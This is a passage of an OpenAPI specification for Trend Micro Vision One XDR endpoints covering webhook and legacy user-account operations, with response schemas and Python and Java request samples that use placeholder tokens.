            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/notifications/webhooks/{webhook_id}'\nurl_path = url_path.format(**{'webhook_id': 'YOUR_WEBHOOK_ID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'headerData': 'YOUR_HEADERDATA (object)',\n    'isVerifyingCertificate': 'YOUR_ISVERIFYINGCERTIFICATE (boolean)',\n    'isGeneratingClientCert': 'YOUR_ISGENERATINGCLIENTCERT (boolean)'\n}\n\nr = requests.put(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/notifications/webhooks/{webhook_id}\";\n        urlPath = urlPath.replace(\"{webhook_id}\", \"YOUR_WEBHOOK_ID\");\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"headerData\\\": \\\"YOUR_HEADERDATA (object)\\\",\" +\n                \"    \\\"isVerifyingCertificate\\\": \\\"YOUR_ISVERIFYINGCERTIFICATE (boolean)\\\",\" +\n                \"    \\\"isGeneratingClientCert\\\": \\\"YOUR_ISGENERATINGCLIENTCERT (boolean)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.put(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      },
      "delete": {
        "tags": [
          "Webhooks"
        ],
        "summary": "Delete webhook request information",
        "description": "Deletes information about a specific webhook request using the webhook ID\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Alert Notifications</b><br>\n  <ul>\n    <li>Configure settings</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "webhook_id",
            "in": "path",
            "description": "The webhook id of request in db.",
            "required": true,
            "schema": {
              "type": "string",
              "maxLength": 24
            }
          }
        ],
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "code",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "example": "Success",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "example": "Success",
                      "default": "Success"
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/notifications/webhooks/{webhook_id}'\nurl_path = url_path.format(**{'webhook_id': 'YOUR_WEBHOOK_ID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.delete(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/notifications/webhooks/{webhook_id}\";\n        urlPath = urlPath.replace(\"{webhook_id}\", \"YOUR_WEBHOOK_ID\");\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.delete(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/notifications/webhooks/triggerRequest": {
      "post": {
        "tags": [
          "Webhooks"
        ],
        "summary": "Send test webhook request",
        "description": "Sends a test request to all webhook URLs for a specific Trend Vision One app or feature\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Alert Notifications</b><br>\n  <ul>\n    <li>Configure settings</li>\n  </ul>\n\n</div>\n",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "title": "request body",
                "type": "object",
                "required": [
                  "eventType",
                  "eventData"
                ],
                "properties": {
                  "eventType": {
                    "type": "string",
                    "maxLength": 128,
                    "description": "The configuration is used to identify which module it belongs to. All the webhook requests of the eventType will be sent. e.g. 'workbench','dddcloud'.\n"
                  },
                  "eventData": {
                    "type": "object",
                    "description": "The data will be sent in webhook request body.\n"
                  }
                }
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "code",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "example": "Success",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "example": "Success",
                      "default": "Success"
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/notifications/webhooks/triggerRequest'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'eventType': 'YOUR_EVENTTYPE (string)',\n    'eventData': 'YOUR_EVENTDATA (object)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/notifications/webhooks/triggerRequest\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"eventType\\\": \\\"YOUR_EVENTTYPE (string)\\\",\" +\n                \"    \\\"eventData\\\": \\\"YOUR_EVENTDATA (object)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/accounts/{email}": {
      "post": {
        "tags": [
          "Accounts (Legacy)"
        ],
        "summary": "Create account",
        "description": "Creates user accounts\n\nNote: \n- This feature is not available for customers that signed up for or expressly updated Trend Vision One after July 3, 2023.\n- Local accounts require email verification.\n\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>User Accounts</b><br>\n  <ul>\n    <li>View</li>\n    <li>Configure account settings</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "email",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string"
            }
          }
        ],
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "title": "empty object",
                "type": "object",
                "properties": {
                  "type": {
                    "type": "integer",
                    "description": "User account type. If no value is specified, 'type' defaults to '0'. <br>\nSupported values: \n* 0 - Local account\n* 1 - SAML account\n"
                  },
                  "name": {
                    "type": "string",
                    "description": "Obsolete. It is only used when \"lastName\" does not exist. It is recommended to use \"firstName\" and \"lastName\".\n* If \"name\", \"firstName\", and \"lastName\" are provided, only \"firstName\" and \"lastName\" are stored by the API.\n* If \"name\" and \"firstName\" are provided, \"name\" is stored as \"lastName\".\n* If \"name\" and \"lastName\" are provided, \"name\" is ignored and \"firstName\" remains empty.\n"
                  },
                  "firstName": {
                    "type": "string",
                    "description": "User's first name. \n"
                  },
                  "lastName": {
                    "type": "string",
                    "description": "User's last name.\n"
                  },
                  "description": {
                    "type": "string"
                  },
                  "token": {
                    "type": "string",
                    "deprecated": true
                  },
                  "authorization": {
                    "type": "integer",
                    "deprecated": true,
                    "description": "Access level of the user account. If no value is specified, 'authorization' defaults to '1'. <br>\nSupported values:  \n* 1 - Trend Vision One console only\n* 2 - Trend Vision One APIs only\n* 3 - Trend Vision One console and APIs\n"
                  },
                  "role": {
                    "type": "string",
                    "description": "Predefined user roles in Trend Vision One. If no value is specified, 'role' defaults to 'Master Administrator'. <br>\nAvailable values:\n* Master Administrator\n* Operator\n* Auditor\n* Senior Analyst\n* Analyst\n"
                  }
                }
              }
            }
          },
          "required": false
        },
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "code",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "default": "Success"
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-codegen-request-body-name": "root",
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/accounts/{email}'\nurl_path = url_path.format(**{'email': 'YOUR_EMAIL'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'type': 'YOUR_TYPE (integer)',\n    'name': 'YOUR_NAME (string)',\n    'firstName': 'YOUR_FIRSTNAME (string)',\n    'lastName': 'YOUR_LASTNAME (string)',\n    'description': 'YOUR_DESCRIPTION (string)',\n    'role': 'YOUR_ROLE (string)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/accounts/{email}\";\n        urlPath = urlPath.replace(\"{email}\", \"YOUR_EMAIL\");\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"type\\\": \\\"YOUR_TYPE (integer)\\\",\" +\n                \"    \\\"name\\\": \\\"YOUR_NAME (string)\\\",\" +\n                \"    \\\"firstName\\\": \\\"YOUR_FIRSTNAME (string)\\\",\" +\n                \"    \\\"lastName\\\": \\\"YOUR_LASTNAME (string)\\\",\" +\n                \"    \\\"description\\\": \\\"YOUR_DESCRIPTION (string)\\\",\" +\n                \"    \\\"role\\\": \\\"YOUR_ROLE (string)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      },
      "delete": {
        "tags": [
          "Accounts (Legacy)"
        ],
        "summary": "Deletes a user account.",
        "description": "Deletes an account from Trend Vision One\n\nNote: This feature is not available for customers that signed up for or expressly updated Trend Vision One after July 3, 2023.\n\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>User Accounts</b><br>\n  <ul>\n    <li>View</li>\n    <li>Configure account settings</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "email",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string"
            }
          }
        ],
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "code",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "default": "Success"
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/accounts/{email}'\nurl_path = url_path.format(**{'email': 'YOUR_EMAIL'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.delete(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
